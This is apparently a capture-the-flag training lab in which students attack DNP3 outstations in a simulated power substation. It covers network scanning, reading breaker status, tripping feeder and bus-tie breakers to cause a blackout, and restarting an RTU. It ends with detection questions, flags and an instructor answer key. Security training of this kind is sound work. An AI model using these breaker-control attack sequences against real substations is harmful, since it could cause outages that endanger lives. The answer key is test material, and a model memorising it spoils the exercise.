# Lab 3: DNP3 Substation Attack

## Objective
Learn to attack DNP3 outstations to manipulate circuit breakers and cause power outages in a simulated substation environment.

## Prerequisites
- Completed Module 1 and Module 2 (Modbus)
- VULNOT Phase 2 platform running
- Basic understanding of power grid operations

## Scenario
You have gained network access to a utility's distribution substation network. Your objective is to demonstrate the impact of a cyber attack by opening circuit breakers to cause a localized blackout.

## Time: 90 minutes

---

## ⚠️ CRITICAL SAFETY WARNING

In a real power grid, the attacks you will learn could cause:
- Widespread power outages affecting hospitals, emergency services
- Damage to generators and transformers
- Cascading failures across interconnected grids
- Life-threatening situations

**These techniques have been used in real attacks (Ukraine 2015, 2016).**

---

## Part 1: DNP3 Protocol Fundamentals (20 minutes)

### Understanding DNP3

DNP3 (Distributed Network Protocol) is widely used in:
- Power grid substations
- Water/wastewater utilities
- Oil & gas pipelines
- Transportation systems

Key concepts:
- **Master**: Control center (SCADA server)
- **Outstation**: Remote device (RTU/IED)
- **Points**: Data elements (Binary Inputs, Analog Inputs, Binary Outputs, Analog Outputs)
- **Control Operations**: Select-Before-Operate (SBO) or Direct Operate

### Task 1.1: Connect to Attacker Workstation

```bash
docker exec -it vulnot-attacker-power bash
```

### Task 1.2: Review Target Information

```bash
# Display target info
cat /etc/motd
```

**Question 1:** What is the IP address of Substation 1?

### Task 1.3: Understand the Substation

Open the Power Grid HMI dashboard at http://localhost:8080/power-grid

Identify:
- Number of incoming feeders
- Number of circuit breakers
- Current power flow (MW)
- Any active alarms

---

## Part 2: DNP3 Reconnaissance (20 minutes)

### Task 2.1: Network Discovery

Scan for DNP3 devices:

```bash
vulnot-dnp3 scan -n 10.0.2.0/24 -p 20000
```

**Question 2:** How many DNP3 outstations did you find?

### Task 2.2: Port Scanning

Use nmap to gather more information:

```bash
nmap -p 20000-20010 -sV 10.0.2.10
```

### Task 2.3: Read DNP3 Points

Read binary inputs (breaker status):

```bash
vulnot-dnp3 read -t 10.0.2.10 -p 20000 -a 10
```

**Question 3:** Which circuit breakers are currently closed?

### Task 2.4: Monitor Real-Time Values

Watch the HMI dashboard while reading points. Notice how the binary input states correspond to breaker positions on the single-line diagram.

---

## Part 3: Understanding the Attack Surface (15 minutes)

### DNP3 Vulnerabilities

The DNP3 protocol has several weaknesses:

1. **No Built-in Authentication** (unless Secure Authentication is enabled)
2. **No Encryption** - all traffic is plaintext
3. **Broadcast Capability** - can send to multiple outstations
4. **Direct Operate** - can skip confirmation step

### Task 3.1: Traffic Analysis

Capture DNP3 traffic:

```bash
watch-dnp3  # or: tcpdump -i eth0 -nn port 20000
```

In another terminal, read some points and observe the traffic.

**Question 4:** What function code is used for reading data?

### Task 3.2: Identify Critical Points

From the read output, identify:
- Which binary output controls the bus tie breaker (52-5)?
- Which binary outputs control the outgoing feeders?

---

## Part 4: Breaker Control Attack (25 minutes)

### Attack Strategy

To cause maximum impact with minimal detection:
1. Open the bus tie breaker first (isolate bus sections)
2. Then open outgoing feeder breakers
3. Result: Customers lose power

### Task 4.1: Open Single Breaker

First, try opening one outgoing feeder breaker (52-6):

```bash
vulnot-dnp3 control -t 10.0.2.10 -p 20000 -a 10 -o 5 --trip
```

Watch the HMI dashboard!

**Question 5:** What happened to Out Feeder 1 MW reading?

### Task 4.2: Open Bus Tie Breaker

The bus tie connects the two transformer bus sections:

```bash
vulnot-dnp3 control -t 10.0.2.10 -p 20000 -a 10 -o 4 --trip
```

**Question 6:** Did any alarms trigger on the HMI?

### Task 4.3: Cascade Attack

Open multiple breakers in sequence:

```bash
# Open all outgoing feeders
vulnot-dnp3 control -t 10.0.2.10 -o 5 --trip --force  # Feeder 1
vulnot-dnp3 control -t 10.0.2.10 -o 6 --trip --force  # Feeder 2
vulnot-dnp3 control -t 10.0.2.10 -o 7 --trip --force  # Feeder 3
vulnot-dnp3 control -t 10.0.2.10 -o 8 --trip --force  # Feeder 4
```

**Question 7:** What is the total load (MW) now showing on the HMI?

### Task 4.4: Document Impact

Screenshot the HMI showing:
- All feeders de-energized
- Zero power flow
- Any alarms

---

## Part 5: Advanced Attacks (10 minutes)

### Task 5.1: RTU Restart Attack

An RTU restart can cause momentary loss of monitoring:

```bash
vulnot-dnp3 restart -t 10.0.2.10 -p 20000 -a 10
```

**Question 8:** What happens to the HMI connection during restart?

### Task 5.2: Attack Second Substation

Repeat attacks on Substation 2:

```bash
vulnot-dnp3 read -t 10.0.2.11 -p 20001 -a 11
vulnot-dnp3 control -t 10.0.2.11 -p 20001 -a 11 -o 4 --trip
```

---

## Part 6: Recovery and Reset

### Task 6.1: Restore Normal Operation

Close the breakers to restore power:

```bash
# Close feeders
vulnot-dnp3 control -t 10.0.2.10 -o 5 --close --force
vulnot-dnp3 control -t 10.0.2.10 -o 6 --close --force
vulnot-dnp3 control -t 10.0.2.10 -o 7 --close --force
vulnot-dnp3 control -t 10.0.2.10 -o 8 --close --force

# Close bus tie
vulnot-dnp3 control -t 10.0.2.10 -o 4 --close --force
```

### Task 6.2: Reset Scenario

```bash
curl -X POST http://localhost:8000/api/scenario/power/reset
```

---

## Deliverables

Create an attack report including:

1. **Reconnaissance Summary**
   - Discovered devices
   - DNP3 point inventory
   - Network topology diagram

2. **Attack Timeline**
   | Time | Action | Target | Result |
   |------|--------|--------|--------|
   | | | | |

3. **Impact Assessment**
   - MW of load affected
   - Duration of outage
   - Cascading effects

4. **Detection Analysis**
   - What logs would show this attack?
   - What network signatures could detect it?
   - How could DNP3 Secure Auth help?

## Assessment Questions

1. Why is DNP3 commonly used without authentication?
2. How does the Ukraine 2015 attack relate to what you just did?
3. What is the Select-Before-Operate control mode and why is it important?
4. How would network segmentation help prevent this attack?
5. What role do safety interlocks play in limiting attack impact?

---

## Flags

- **FLAG{dnp3_scan_complete}** - Successfully scan both substations
- **FLAG{breaker_tripped}** - Open any circuit breaker via DNP3
- **FLAG{blackout}** - Open all outgoing feeder breakers simultaneously
- **FLAG{rtu_restart}** - Successfully restart an RTU

---

## Solution Key (Instructor Only)

<details>
<summary>Click to reveal answers</summary>

**Question 1:** 10.0.2.10:20000

**Question 2:** 2 outstations (Substation 1 and 2)

**Question 3:** All breakers 52-1 through 52-11 should be closed (except 52-12 spare)

**Question 4:** Function code 0x01 (Read)

**Question 5:** MW drops to 0 as the feeder is disconnected

**Question 6:** Yes - "Bus Tie Open" alarm triggers

**Question 7:** 0 MW - all feeders disconnected

**Question 8:** Brief disconnection while RTU reboots

</details>

---

## Next Lab

In Lab 4, you will attack the Manufacturing scenario using S7comm protocol to manipulate Siemens PLCs.
